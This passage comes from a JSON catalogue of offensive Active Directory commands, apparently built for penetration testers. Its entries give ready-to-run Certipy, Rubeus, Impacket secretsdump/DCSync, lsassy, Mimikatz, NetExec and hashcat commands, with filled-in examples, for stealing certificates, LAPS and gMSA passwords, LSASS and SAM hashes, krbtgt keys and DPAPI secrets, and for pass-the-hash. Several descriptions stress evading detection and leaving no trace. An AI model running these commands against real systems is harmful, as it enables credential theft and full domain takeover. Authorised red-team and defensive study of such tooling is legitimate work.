        "certipy account update -u attacker@corp.local -p Pass -user victim -upn administrator",
        "# 2. Request cert as victim",
        "certipy req -u victim@corp.local -p VictimPass -dc-ip 10.10.10.10 -ca 'CORP-CA' -template ESC9-Template",
        "# 3. Restore UPN and auth with cert",
        "certipy auth -pfx administrator.pfx -domain corp.local"
      ]
    },
    {
      "id": "certipy-find",
      "name": "Certipy Find Vulnerable Templates",
      "command": "certipy find -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -vulnerable -stdout",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "Enumerate ADCS certificate templates and identify vulnerable configurations",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "certipy",
        "adcs",
        "certificate",
        "enumeration",
        "esc1",
        "esc4",
        "esc8"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "certipy find -u '<user>@<domain>' -hashes ':<hash>' -dc-ip <ip> -vulnerable -stdout"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "certipy find -u '<user>@<domain>' -k -no-pass -dc-ip <ip> -vulnerable -stdout"
        }
      ],
      "examples": [
        "certipy find -u 'user@corp.local' -p 'password' -dc-ip 192.168.1.100 -vulnerable -stdout"
      ]
    },
    {
      "id": "certipy-relay",
      "name": "Certipy Relay to ADCS",
      "command": "certipy relay -target 'http://<ip>/certsrv/certfnsh.asp' -ca '<ca_name>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "Relay NTLM authentication to ADCS web enrollment to obtain a certificate",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "ntlm",
        "http"
      ],
      "tags": [
        "certipy",
        "adcs",
        "relay",
        "esc8",
        "web-enrollment"
      ],
      "examples": [
        "certipy relay -target 'http://192.168.1.100/certsrv/certfnsh.asp' -ca 'CORP-CA'"
      ]
    },
    {
      "id": "certipy-req",
      "name": "Certipy Request Certificate",
      "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca '<ca_name>' -template '<template>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "Request a certificate from a vulnerable ADCS template",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "certipy",
        "adcs",
        "certificate",
        "esc1",
        "request"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "certipy req -u '<user>@<domain>' -hashes ':<hash>' -dc-ip <ip> -ca '<ca_name>' -template '<template>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "certipy req -u '<user>@<domain>' -k -no-pass -dc-ip <ip> -ca '<ca_name>' -template '<template>'"
        }
      ],
      "examples": [
        "certipy req -u 'user@corp.local' -p 'password' -dc-ip 192.168.1.100 -ca 'CORP-CA' -template 'VulnTemplate'"
      ]
    },
    {
      "id": "certipy-shadow",
      "name": "Certipy Shadow Credentials",
      "command": "certipy shadow auto -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -account '<target_user>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "Abuse shadow credentials to obtain a certificate for a target account",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "certipy",
        "adcs",
        "shadow-credentials",
        "msds-keycredentiallink"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "certipy shadow auto -u '<user>@<domain>' -hashes ':<hash>' -dc-ip <ip> -account '<target_user>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "certipy shadow auto -u '<user>@<domain>' -k -no-pass -dc-ip <ip> -account '<target_user>'"
        }
      ],
      "examples": [
        "certipy shadow auto -u 'user@corp.local' -p 'password' -dc-ip 192.168.1.100 -account 'admin'"
      ]
    },
    {
      "id": "certipy-shadow-credentials",
      "name": "Certipy Shadow Credentials (msDS-KeyCredentialLink)",
      "command": "certipy shadow auto -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -account '<target>'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "Abuse GenericAll/GenericWrite/WriteProperty over a target by writing a Key Credential to msDS-KeyCredentialLink, then PKINIT-authenticate as the target to recover their NT hash. The 'auto' subcommand handles add → auth → cleanup in one shot.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap",
        "kerberos"
      ],
      "tags": [
        "certipy",
        "shadow-credentials",
        "kcl",
        "pkinit",
        "genericwrite"
      ],
      "variations": [
        {
          "label": "Manual Add",
          "requires": "password",
          "command": "certipy shadow add -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -account '<target>'"
        },
        {
          "label": "List",
          "requires": "password",
          "command": "certipy shadow list -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -account '<target>'"
        },
        {
          "label": "Clear",
          "requires": "password",
          "command": "certipy shadow clear -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -account '<target>'"
        }
      ],
      "references": [
        {
          "title": "Shadow Credentials",
          "url": "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ec"
        }
      ],
      "examples": [
        "certipy shadow auto -u jdoe@corp.local -p Password123! -dc-ip 10.10.10.10 -account targetuser"
      ]
    },
    {
      "id": "certipy-template",
      "name": "Certipy Template Edit (ESC4)",
      "command": "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -template '<template>' -write-default-configuration -save-configuration '<template>.json'",
      "category": "credential-attacks",
      "subcategory": "adcs",
      "description": "ESC4: when you have GenericWrite/WriteOwner over a template, rewrite its security descriptor / flags to make it ESC1-style vulnerable, then restore the original. -save-configuration takes a backup before modifying so cleanup leaves no trace. Verified against Certipy v5.x parser.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "certipy",
        "adcs",
        "esc4",
        "template",
        "writeowner",
        "genericwrite"
      ],
      "variations": [
        {
          "label": "Restore From Backup",
          "requires": "password",
          "command": "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -template '<template>' -write-configuration '<template>.json'"
        },
        {
          "label": "No Backup",
          "requires": "password",
          "command": "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -template '<template>' -write-default-configuration -no-save"
        }
      ],
      "references": [
        {
          "title": "Certipy README",
          "url": "https://github.com/ly4k/Certipy"
        }
      ],
      "examples": [
        "certipy template -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -template 'WebServer' -write-default-configuration -save-configuration WebServer.json",
        "certipy req -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -ca 'CORP-CA' -template 'WebServer' -upn 'administrator@corp.local'",
        "certipy template -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -template 'WebServer' -write-configuration WebServer.json"
      ]
    },
    {
      "id": "rubeus-asreproast",
      "name": "Rubeus asreproast",
      "command": "Rubeus.exe asreproast /outfile:asrep.txt",
      "category": "credential-attacks",
      "subcategory": "asreproasting",
      "description": "Find every account with DONT_REQ_PREAUTH set and dump AS-REP hashes for offline cracking (hashcat 18200). Runs from a domain-joined Windows host with no special privileges.",
      "platform": "windows",
      "requires": [
        "shell"
      ],
      "protocols": [
        "kerberos",
        "ldap"
      ],
      "tags": [
        "rubeus",
        "asreproast",
        "pre-auth"
      ],
      "variations": [
        {
          "label": "Specific User",
          "requires": "shell",
          "command": "Rubeus.exe asreproast /user:<target-user> /outfile:asrep.txt"
        },
        {
          "label": "Hashcat Format",
          "requires": "shell",
          "command": "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt"
        }
      ],
      "references": [
        {
          "title": "Rubeus",
          "url": "https://github.com/GhostPack/Rubeus"
        }
      ],
      "examples": [
        "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt"
      ]
    },
    {
      "id": "bloodyad-laps",
      "name": "BloodyAD LAPS Password Read",
      "command": "bloodyAD --host '<ip>' -d '<domain>' -u '<user>' -p '<password>' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime",
      "category": "credential-attacks",
      "subcategory": "gmsa-laps",
      "description": "Read LAPS passwords from Active Directory using BloodyAD",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "laps",
        "ms-mcs-admpwd",
        "local-admin",
        "password"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "bloodyAD --host '<ip>' -d '<domain>' -u '<user>' --hashes ':<hash>' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"
        }
      ],
      "examples": [
        "bloodyAD --host '192.168.1.2' -d 'corp.local' -u 'user' -p 'password' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"
      ]
    },
    {
      "id": "gmsa-dumper",
      "name": "gMSA Password Dump",
      "command": "python gMSADumper.py -u '<user>' -p '<password>' -d '<domain>' -l '<ip>'",
      "category": "credential-attacks",
      "subcategory": "gmsa-laps",
      "description": "Read password of Group Managed Service Account",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "gmsa",
        "password",
        "service-account",
        "ldap"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "python gMSADumper.py -u '<user>' -p '<hash>' -d '<domain>' -l '<ip>'"
        }
      ],
      "references": [
        {
          "title": "ReadGMSAPassword",
          "url": "https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword"
        }
      ],
      "examples": [
        "python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb -l tombwatcher.htb"
      ]
    },
    {
      "id": "impacket-GetLAPSPassword",
      "name": "Impacket GetLAPSPassword",
      "command": "impacket-GetLAPSPassword '<domain>/<user>:<password>' -dc-ip '<ip>'",
      "category": "credential-attacks",
      "subcategory": "gmsa-laps",
      "description": "Retrieve LAPS managed local administrator passwords from Active Directory",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "impacket",
        "laps",
        "local-admin",
        "credential-dumping",
        "ldap"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-GetLAPSPassword -hashes ':<hash>' -dc-ip '<ip>' '<domain>/<user>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-GetLAPSPassword -k -no-pass -dc-ip '<ip>' '<domain>/<user>'"
        }
      ],
      "examples": [
        "impacket-GetLAPSPassword 'CORP.LOCAL/user:password' -dc-ip '192.168.1.100'"
      ]
    },
    {
      "id": "nxc-laps",
      "name": "NetExec LAPS Module (Read ms-MCS-AdmPwd)",
      "command": "nxc ldap <target> -u '<user>' -p '<password>' -M laps",
      "category": "credential-attacks",
      "subcategory": "gmsa-laps",
      "description": "Read LAPS-managed local admin passwords from ms-MCS-AdmPwd / msLAPS-Password attributes for every computer the user is permitted to read. Output is a ready-to-use host:user:password list.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "netexec",
        "nxc",
        "laps",
        "ldap",
        "credentials"
      ],
      "variations": [
        {
          "label": "Hash Auth",
          "requires": "hash",
          "command": "nxc ldap <target> -u '<user>' -H '<hash>' -M laps"
        }
      ],
      "references": [
        {
          "title": "NetExec laps module",
          "url": "https://www.netexec.wiki/ldap-protocol/laps"
        }
      ],
      "examples": [
        "nxc ldap dc.corp.local -u jdoe -p 'Password123!' -M laps"
      ]
    },
    {
      "id": "nxc-ldap-gmsa",
      "name": "NetExec LDAP gMSA Dump",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' --gmsa",
      "category": "credential-attacks",
      "subcategory": "gmsa-laps",
      "description": "Read Group Managed Service Account passwords via NetExec",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "gmsa",
        "service-account",
        "password"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' --gmsa"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.2' -u 'provisioningsvc' -H '44dea6608c25a85d578d0c2b6f8355c4' --gmsa"
      ]
    },
    {
      "id": "nxc-ldap-laps",
      "name": "NetExec LDAP LAPS",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M laps",
      "category": "credential-attacks",
      "subcategory": "gmsa-laps",
      "description": "Retrieve LAPS managed local administrator passwords from Active Directory via LDAP",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "laps",
        "local-admin",
        "credential-dumping"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' -M laps"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -u '<user>' --use-kcache -M laps"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' -M laps"
      ]
    },
    {
      "id": "hashcat-asrep",
      "name": "Hashcat AS-REP Roasting Cracking",
      "command": "hashcat -m 18200 '<hash_file>' /usr/share/wordlists/rockyou.txt",
      "category": "credential-attacks",
      "subcategory": "hash-cracking",
      "description": "Crack AS-REP roasting hashes obtained from accounts without Kerberos pre-auth",
      "platform": "linux",
      "tags": [
        "hashcat",
        "asrep",
        "as-rep-roasting",
        "kerberos",
        "hash-cracking",
        "offline"
      ],
      "variations": [
        {
          "label": "With Rules",
          "requires": null,
          "command": "hashcat -m 18200 '<hash_file>' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
        }
      ],
      "examples": [
        "hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt"
      ]
    },
    {
      "id": "Cracking-Kerberoasting-hashes",
      "name": "Hashcat Kerberoast Crack",
      "command": "sudo hashcat -m 13100 kerberoasting.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force",
      "category": "credential-attacks",
      "subcategory": "hash-cracking",
      "description": "Crack Kerberoasting hashes",
      "platform": "cross-platform",
      "requires": [
        "hash"
      ],
      "protocols": [],
      "tags": [
        "hashcat",
        "kerberoasting",
        "cracking",
        "kerberos"
      ],
      "examples": [
        "sudo hashcat -m 13100 kerberoasting.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"
      ]
    },
    {
      "id": "hashcat-mscache",
      "name": "Hashcat MSCacheV2 (DCC2) Cracking",
      "command": "hashcat -m 2100 '<hash_file>' /usr/share/wordlists/rockyou.txt",
      "category": "credential-attacks",
      "subcategory": "hash-cracking",
      "description": "Crack MSCacheV2 (Domain Cached Credentials v2 / DCC2) hashes extracted from registry",
      "platform": "linux",
      "tags": [
        "hashcat",
        "mscache",
        "dcc2",
        "cached-credentials",
        "hash-cracking",
        "offline"
      ],
      "variations": [
        {
          "label": "With Rules",
          "requires": null,
          "command": "hashcat -m 2100 '<hash_file>' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
        }
      ],
      "examples": [
        "hashcat -m 2100 mscache.hashes /usr/share/wordlists/rockyou.txt"
      ]
    },
    {
      "id": "hashcat-ntlm",
      "name": "Hashcat NTLM Crack",
      "command": "hashcat -m 1000 <hash> <wordlist>",
      "category": "credential-attacks",
      "subcategory": "hash-cracking",
      "description": "Crack NTLM hashes using wordlist attack",
      "platform": "cross-platform",
      "requires": [
        "hash"
      ],
      "protocols": [],
      "tags": [
        "hashcat",
        "ntlm",
        "cracking",
        "password"
      ],
      "references": [
        {
          "title": "Hashcat Official Documentation",
          "url": "https://hashcat.net/hashcat/"
        },
        {
          "title": "HackTricks - Hash Cracking",
          "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#hash"
        }
      ],
      "examples": [
        "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt"
      ]
    },
    {
      "id": "hashcat-ntlmv2",
      "name": "Hashcat NTLMv2 Cracking",
      "command": "hashcat -m 5600 '<hash_file>' /usr/share/wordlists/rockyou.txt",
      "category": "credential-attacks",
      "subcategory": "hash-cracking",
      "description": "Crack NTLMv2 (NetNTLMv2) challenge-response hashes captured from Responder or relay attacks",
      "platform": "linux",
      "tags": [
        "hashcat",
        "ntlmv2",
        "hash-cracking",
        "responder",
        "offline"
      ],
      "variations": [
        {
          "label": "With Rules",
          "requires": null,
          "command": "hashcat -m 5600 '<hash_file>' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
        },
        {
          "label": "With Mask (8+ chars)",
          "requires": null,
          "command": "hashcat -m 5600 '<hash_file>' -a 3 '?a?a?a?a?a?a?a?a'"
        }
      ],
      "examples": [
        "hashcat -m 5600 ntlmv2.hashes /usr/share/wordlists/rockyou.txt"
      ]
    },
    {
      "id": "impacket-dpapi",
      "name": "Impacket DPAPI Masterkey",
      "command": "impacket-dpapi masterkey -file '<masterkey_file>' -password '<password>'",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Decrypt DPAPI masterkey using user password to derive DPAPI encryption key",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "tags": [
        "impacket",
        "dpapi",
        "masterkey",
        "credential-dumping",
        "decryption"
      ],
      "examples": [
        "impacket-dpapi masterkey -file '0e4b4e4c-...' -password 'userpassword'"
      ]
    },
    {
      "id": "secretsdump",
      "name": "Impacket Secrets Dump",
      "command": "impacket-secretsdump '<domain>/<user>:<password>'@<ip>",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Dump hashes from remote Windows system (SAM, LSA, NTDS)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "impacket",
        "secretsdump",
        "hashes",
        "sam",
        "ntds",
        "dcsync"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-secretsdump -hashes ':<hash>' '<domain>/<user>'@<ip>"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-secretsdump -k -no-pass '<domain>/<user>'@<ip>"
        },
        {
          "label": "DCSync (just NTLM)",
          "requires": "ticket",
          "command": "impacket-secretsdump -k -no-pass '<domain>/<user>'@<ip> -just-dc-ntlm -outputfile dcsync"
        },
        {
          "label": "DCSync (full)",
          "requires": "ticket",
          "command": "impacket-secretsdump -k -no-pass '<domain>/<user>'@<ip> -just-dc -outputfile dcsync -pwd-last-set -user-status"
        }
      ],
      "references": [
        {
          "title": "Impacket Secretsdump Documentation",
          "url": "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py"
        },
        {
          "title": "HackTricks - Credentials Dumping",
          "url": "https://book.hacktricks.xyz/windows-hardening/stealing-credentials"
        }
      ],
      "examples": [
        "impacket-secretsdump 'CORP/administrator:password123'@192.168.1.100",
        "impacket-secretsdump -hashes ':e19ccf75ee54e06b06a5907af13cef42' 'CORP/administrator'@192.168.1.100"
      ]
    },
    {
      "id": "secretsdump-just-dc-user",
      "name": "Impacket Targeted DCSync (Single User)",
      "command": "impacket-secretsdump -just-dc-user <target_user> '<domain>/<user>:<password>@<dc-ip>'",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "DCSync only one specific account instead of replicating the whole NTDS. Massively reduces noise on the wire and in the DC's directory replication logs. Useful when you only need krbtgt, a domain admin, or a single service account.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb",
        "rpc"
      ],
      "tags": [
        "impacket",
        "secretsdump",
        "dcsync",
        "targeted",
        "stealth",
        "krbtgt"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-secretsdump -just-dc-user <target_user> -hashes ':<hash>' '<domain>/<user>@<dc-ip>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-secretsdump -k -no-pass -just-dc-user <target_user> '<domain>/<user>@<dc-fqdn>'"
        },
        {
          "label": "Krbtgt Only (for Golden)",
          "requires": "password",
          "command": "impacket-secretsdump -just-dc-user 'krbtgt' '<domain>/<user>:<password>@<dc-ip>'"
        }
      ],
      "references": [
        {
          "title": "Impacket — secretsdump.py",
          "url": "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py"
        },
        {
          "title": "The Hacker Recipes — DCSync",
          "url": "https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"
        }
      ],
      "examples": [
        "impacket-secretsdump -just-dc-user krbtgt 'CORP/admin:Password123!@10.10.10.10'",
        "impacket-secretsdump -k -no-pass -just-dc-user administrator 'CORP/admin@dc01.corp.local'"
      ]
    },
    {
      "id": "lsassy",
      "name": "Lsassy LSASS Dump",
      "command": "lsassy -u '<user>' -p '<password>' -d '<domain>' -dc-ip <dc_ip> <ip>",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Remotely dump LSASS credentials using lsassy",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "lsassy",
        "lsass",
        "credentials",
        "dump",
        "remote"
      ],
      "variations": [
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "lsassy -k --no-pass -d '<domain>' <ip>"
        },
        {
          "label": "NetExec Module",
          "requires": "password",
          "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M lsassy"
        },
        {
          "label": "NetExec Module (Hash)",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M lsassy"
        }
      ],
      "examples": [
        "lsassy -u 'user' -p 'password' -d 'corp.local' -dc-ip 192.168.1.2 192.168.1.31",
        "lsassy -k --no-pass -d 'corp.local' us-mssql.corp.local",
        "nxc smb '192.168.1.31' -u 'user' -p 'password' -M lsassy"
      ]
    },
    {
      "id": "mimikatz-dump",
      "name": "Mimikatz Credential Dump",
      "command": "./mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonpasswords' 'lsadump::lsa /inject' 'lsadump::sam' 'lsadump::cache' 'sekurlsa::ekeys' 'vault::cred' 'exit'",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Extract plaintext passwords and hashes from all available sources",
      "platform": "windows",
      "requires": [
        "shell"
      ],
      "protocols": [],
      "tags": [
        "mimikatz",
        "passwords",
        "hashes",
        "lsass",
        "sam"
      ],
      "references": [
        {
          "title": "Mimikatz GitHub",
          "url": "https://github.com/gentilkiwi/mimikatz"
        },
        {
          "title": "HackTricks - Mimikatz",
          "url": "https://book.hacktricks.xyz/windows-hardening/stealing-credentials/mimikatz"
        },
        {
          "title": "Mimikatz Command Reference",
          "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md"
        }
      ],
      "examples": [
        "./mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonpasswords' 'exit'"
      ]
    },
    {
      "id": "mimikatz-dpapi",
      "name": "Mimikatz dpapi::masterkey",
      "command": "mimikatz.exe \"dpapi::masterkey /in:<masterkey-file> /sid:<user-sid> /password:<user-password>\" exit",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Decrypt a DPAPI master key using the owner's plaintext password (or NT hash). Required step before decrypting Chrome/Edge cookies, vault credentials, and Wi-Fi PSKs. Use /rpc on a DC for trustee decryption without the password.",
      "platform": "windows",
      "requires": [
        "shell"
      ],
      "protocols": [],
      "tags": [
        "mimikatz",
        "dpapi",
        "masterkey"
      ],
      "variations": [
        {
          "label": "DC RPC Decrypt (DA)",
          "requires": "shell",
          "command": "mimikatz.exe \"dpapi::masterkey /in:<masterkey-file> /rpc\" exit"
        },
        {
          "label": "Decrypt Credential Blob",
          "requires": "shell",
          "command": "mimikatz.exe \"dpapi::cred /in:<credential-file> /masterkey:<decrypted-mk>\" exit"
        }
      ],
      "examples": [
        "mimikatz.exe \"dpapi::masterkey /in:C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Protect\\<sid>\\<guid> /sid:S-1-5-21-... /password:Password123!\" exit"
      ]
    },
    {
      "id": "mimikatz-dcsync",
      "name": "Mimikatz lsadump::dcsync",
      "command": "mimikatz.exe \"lsadump::dcsync /domain:<domain> /user:<target-user>\" exit",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Pull a single user's NT hash and Kerberos keys directly from a DC via the MS-DRSR replication protocol. No code runs on the DC. Requires DCSync rights (DA, EA, or explicit Replicating Directory Changes / Replicating Directory Changes All).",
      "platform": "windows",
      "requires": [
        "shell"
      ],
      "protocols": [
        "kerberos",
        "rpc"
      ],
      "tags": [
        "mimikatz",
        "dcsync",
        "drsuapi"
      ],
      "variations": [
        {
          "label": "krbtgt (Golden Ticket Prep)",
          "requires": "shell",
          "command": "mimikatz.exe \"lsadump::dcsync /domain:<domain> /user:krbtgt\" exit"
        },
        {
          "label": "All Users",
          "requires": "shell",
          "command": "mimikatz.exe \"lsadump::dcsync /domain:<domain> /all /csv\" exit"
        }
      ],
      "examples": [
        "mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:krbtgt\" exit"
      ]
    },
    {
      "id": "mimikatz-lsadump-sam",
      "name": "Mimikatz lsadump::sam",
      "command": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Extract local SAM hashes (built-in Administrator, local users) from a live Windows host. Run as SYSTEM (token::elevate) for direct registry access.",
      "platform": "windows",
      "requires": [
        "local-admin"
      ],
      "protocols": [],
      "tags": [
        "mimikatz",
        "sam",
        "local-hashes"
      ],
      "variations": [
        {
          "label": "From Hive Files",
          "requires": "shell",
          "command": "mimikatz.exe \"lsadump::sam /sam:SAM.hive /system:SYSTEM.hive\" exit"
        },
        {
          "label": "LSA Secrets",
          "requires": "local-admin",
          "command": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" exit"
        }
      ],
      "examples": [
        "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit"
      ]
    },
    {
      "id": "mimikatz-sekurlsa",
      "name": "Mimikatz sekurlsa::logonpasswords",
      "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Dump credentials (NT hashes, Kerberos keys, plaintext where wdigest is enabled, MSV1_0) from LSASS for every active logon session. The classic post-exploit credential harvest. Requires SeDebugPrivilege.",
      "platform": "windows",
      "requires": [
        "local-admin"
      ],
      "protocols": [],
      "tags": [
        "mimikatz",
        "sekurlsa",
        "lsass",
        "credential-dump"
      ],
      "variations": [
        {
          "label": "From LSASS Minidump",
          "requires": "local-admin",
          "command": "mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" exit"
        },
        {
          "label": "Pass-the-Hash",
          "requires": "local-admin",
          "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt-hash> /run:cmd.exe\" exit"
        }
      ],
      "examples": [
        "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
      ]
    },
    {
      "id": "mimikatz-tickets",
      "name": "Mimikatz Ticket Extraction",
      "command": "./mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::tickets' 'exit'",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Extract cached Kerberos tickets",
      "platform": "windows",
      "requires": [
        "shell"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "mimikatz",
        "tickets",
        "kerberos",
        "extraction"
      ],
      "examples": [
        "./mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::tickets' 'exit'"
      ]
    },
    {
      "id": "nxc-dpapi-hash",
      "name": "NetExec dpapi_hash Module",
      "command": "nxc smb <target> -u '<user>' -p '<password>' -M dpapi_hash",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Extract DPAPI master-key hashes for offline cracking with hashcat (mode 15300 for v1 / 15900 for v2). Lighter than full DPAPI decryption — drops just the encrypted key blobs and metadata so you can crack the user's password offline if you only have a low-priv shell. Requires local admin or the target user's hive access.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "netexec",
        "nxc",
        "dpapi",
        "hashcat",
        "offline-cracking"
      ],
      "references": [
        {
          "title": "DPAPI hash modes (hashcat)",
          "url": "https://hashcat.net/wiki/doku.php?id=example_hashes"
        }
      ],
      "examples": [
        "nxc smb 10.10.10.10 -u administrator -p 'Password123!' -M dpapi_hash"
      ]
    },
    {
      "id": "nxc-eventlog-creds",
      "name": "NetExec eventlog_creds Module",
      "command": "nxc smb <target> -u '<user>' -p '<password>' -M eventlog_creds",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Harvest plaintext credentials passed to processes (typically scheduled tasks, runas, custom scripts) from Security event log 4688 entries when process-creation auditing with command-line capture is enabled. Added in NetExec v1.5.0. Requires local admin to read the Security log.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "netexec",
        "nxc",
        "eventlog",
        "credentials",
        "audit-log"
      ],
      "references": [
        {
          "title": "NetExec v1.5.0 release",
